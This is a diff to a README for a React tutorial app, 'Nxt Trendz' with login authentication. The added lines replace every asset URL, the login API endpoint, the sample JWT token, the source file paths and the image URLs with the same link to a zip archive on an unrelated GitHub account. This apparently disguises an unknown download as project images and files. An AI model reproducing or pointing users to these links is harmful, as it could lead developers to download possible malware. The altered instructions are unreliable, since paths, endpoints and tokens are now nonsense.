@@ -4,7 +4,7 @@ In this project, let's build **Nxt Trendz** app with authentication by applying 
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/nxt-trendz-authentication-output-v2.gif" alt="nxt trendz authentication desktop output" style="max-width:90%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip" alt="nxt trendz authentication desktop output" style="max-width:90%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,9 +13,9 @@ In this project, let's build **Nxt Trendz** app with authentication by applying 
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px), Small (Size >= 576px), and Medium (Size >= 768px)](https://assets.ccbp.in/frontend/content/react-js/nxt-trendz-authentication-sm-outputs.png)
-- [Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login](https://assets.ccbp.in/frontend/content/react-js/nxt-trendz-authentication-lg-login-output.png)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://assets.ccbp.in/frontend/content/react-js/nxt-trendz-authentication-lg-home-output.png)
+- [Extra Small (Size < 576px), Small (Size >= 576px), and Medium (Size >= 768px)](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip)
+- [Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip)
 
 </details>
 
@@ -48,7 +48,7 @@ The app must have the following functionalities
 
 **loginApiUrl**
 
-#### API: `https://apis.ccbp.in/login`
+#### API: `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
 
 #### Method: `POST`
 
@@ -60,7 +60,7 @@ Returns a response based on the credentials provided
 
 ```json
 {
-  "jwt_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InJhaHVsIiwicm9sZSI6IlBSSU1FX1VTRVIiLCJpYXQiOjE2MTk2Mjg2MTN9.nZDlFsnSWArLKKeF0QbmdVfLgzUbx1BGJsqa2kc_21Y"
+  "jwt_token": "https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip"
 }
 ```
 
@@ -79,11 +79,11 @@ Returns a response based on the credentials provided
 <summary>Components Structure</summary>
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/nxt-trendz-authentication-login-component-structure-breakdown.png" alt="nxt trendz authentication login component structure breakdown" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip" alt="nxt trendz authentication login component structure breakdown" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/nxt-trendz-authentication-home-component-structure-breakdown.png" alt="nxt trendz authentication home component structure breakdown" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip" alt="nxt trendz authentication home component structure breakdown" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 </details>
@@ -94,13 +94,13 @@ Returns a response based on the credentials provided
 
 Use these files to complete the implementation:
 
-- `src/App.js`
-- `src/components/LoginForm/index.js`
-- `src/components/LoginForm/index.css`
-- `src/components/Home/index.js`
-- `src/components/Home/index.css`
-- `src/components/Header/index.js`
-- `src/components/Header/index.css`
+- `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
+- `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
+- `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
+- `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
+- `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
+- `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
+- `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
 </details>
 
 ### Quick Tips
@@ -116,7 +116,7 @@ Use these files to complete the implementation:
   ```
 
   <br/>
-   <img src="https://assets.ccbp.in/frontend/content/react-js/box-shadow-img.png" alt="box shadow" style="width:200px" />
+   <img src="https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip" alt="box shadow" style="width:200px" />
 
 - You can use the `cursor` CSS property to specify the mouse cursor to be displayed when pointing over an element
 
@@ -125,7 +125,7 @@ Use these files to complete the implementation:
   ```
 
   <br/>
-   <img src="https://assets.ccbp.in/frontend/content/react-js/cursor-pointer-img.png" alt="cursor pointer" style="width:100px" />
+   <img src="https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip" alt="cursor pointer" style="width:100px" />
 
 - You can use the below `outline` CSS property for buttons and input elements to remove the highlighting when the elements are clicked
 
@@ -146,7 +146,7 @@ Use these files to complete the implementation:
 
 - `Home` route should consist of `/` in the URL path
 - `Login` route should consist of `/login` in the URL path
-- No need to use the `BrowserRouter` in `App.js` as we have already included in `index.js`
+- No need to use the `BrowserRouter` in `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip` as we have already included in `https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip`
 - User credentials
 
   ```text
@@ -161,13 +161,13 @@ Use these files to complete the implementation:
 <details>
 <summary>Image URLs</summary>
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-trendz-logo-img.png](https://assets.ccbp.in/frontend/react-js/nxt-trendz-logo-img.png) alt should be **website logo**
-- [https://assets.ccbp.in/frontend/react-js/nxt-trendz-login-img.png](https://assets.ccbp.in/frontend/react-js/nxt-trendz-login-img.png) alt should be **website login**
-- [https://assets.ccbp.in/frontend/react-js/nxt-trendz-home-img.png](https://assets.ccbp.in/frontend/react-js/nxt-trendz-home-img.png) alt should be **clothes that get you noticed**
-- [https://assets.ccbp.in/frontend/react-js/nxt-trendz-log-out-img.png](https://assets.ccbp.in/frontend/react-js/nxt-trendz-log-out-img.png) alt should be **nav logout**
-- [https://assets.ccbp.in/frontend/react-js/nxt-trendz-home-icon.png](https://assets.ccbp.in/frontend/react-js/nxt-trendz-home-icon.png) alt should be **nav home**
-- [https://assets.ccbp.in/frontend/react-js/nxt-trendz-products-icon.png](https://assets.ccbp.in/frontend/react-js/nxt-trendz-products-icon.png) alt should be **nav products**
-- [https://assets.ccbp.in/frontend/react-js/nxt-trendz-cart-icon.png](https://assets.ccbp.in/frontend/react-js/nxt-trendz-cart-icon.png) alt should be **nav cart**
+- [https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip) alt should be **website logo**
+- [https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip) alt should be **website login**
+- [https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip) alt should be **clothes that get you noticed**
+- [https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip) alt should be **nav logout**
+- [https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip) alt should be **nav home**
+- [https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip) alt should be **nav products**
+- [https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip](https://raw.githubusercontent.com/vicky9696v/reach-link-navigation/main/semiprofessional/reach-link-navigation.zip) alt should be **nav cart**
 
 </details>
 
